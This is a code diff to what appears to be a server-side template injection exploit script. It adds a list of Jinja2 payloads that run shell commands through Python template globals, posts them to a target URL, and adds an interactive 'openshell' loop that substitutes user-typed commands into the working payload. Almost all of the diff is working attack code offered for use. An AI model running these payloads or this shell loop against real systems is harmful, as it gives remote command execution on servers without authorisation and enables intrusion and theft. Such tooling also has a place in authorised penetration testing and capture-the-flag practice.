@@ -54,6 +54,20 @@ def exploit(url, key, language):
             print("\n------------------\nPython identified\n------------------")
             print("Trying to open a shell using Jinja2 patterns")
             print("------------------------------------------------------")
+            print("------------------------------------------------------")
+            payloads = ["{{ get_flashed_messages.__globals__.os.popen('id').read() }}", "{{url_for.__globals__.os.popen('id').read()}}", '{{ lipsum.__init__.__globals__.os.popen("id").read() }}', 
+                        '{{ url_for.__globals__.os.popen("id").read() }}', '{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("id").read() }}']
+                        
+            for payload in payloads:
+                try:
+                    r = requests.post(url, data={f"{key}": payload})
+                    if re.search(r"uid=\d+\(.+?\)", r.text):
+                        print(f"Shell obtained with payload '{payload}'\n")
+                        openshell(url, key, payload)
+                        return True
+                except:
+                    continue
+            print("No shell obtained but SSTI is confirmed")
         case "php":
             print("\n------------------\nPHP identified\n------------------")
             print("Trying to open a shell using Twig patterns")
@@ -69,10 +83,20 @@ def exploit(url, key, language):
                     r = requests.post(url, data={f"{key}": payload})
                     if re.search(r"uid=\d+\(.+?\)", r.text):
                         print(f"Shell obtained with payload '{payload}'\n")
+                        openshell(url, key, payload)
                         return True
                 except:
                     continue
             print("No shell obtained but SSTI is confirmed")
+
+def openshell(url, key, payload):
+    cmd = input(">")
+    exec = re.sub(r'\("id"\)', f'("{cmd}")', payload)
+    r = requests.post(url, data={f"{key}": exec})
+    print(r.text)
+    openshell(url, key, payload)
+
+
 def main():
     url = ""
     key = ""
